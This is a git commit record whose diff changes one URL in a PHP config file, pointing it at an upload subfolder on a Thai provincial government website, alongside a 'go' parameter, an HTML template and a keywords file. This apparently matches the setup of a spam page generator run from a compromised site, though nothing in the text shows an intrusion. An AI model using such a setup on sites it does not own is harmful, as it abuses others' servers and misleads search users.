db5e374579447ed228d0da166f05bf40027808a3
ROIHEE <thanawat58311@gmail.com>
2024-09-10 22:11:46 +0800

    Update config.php

--- config.php
+++ config.php
@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://www.lp-pao.go.th/Main60/modules/upload/',
+        'url'		=> 'https://www.lp-pao.go.th/Main60/modules/upload/upload/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
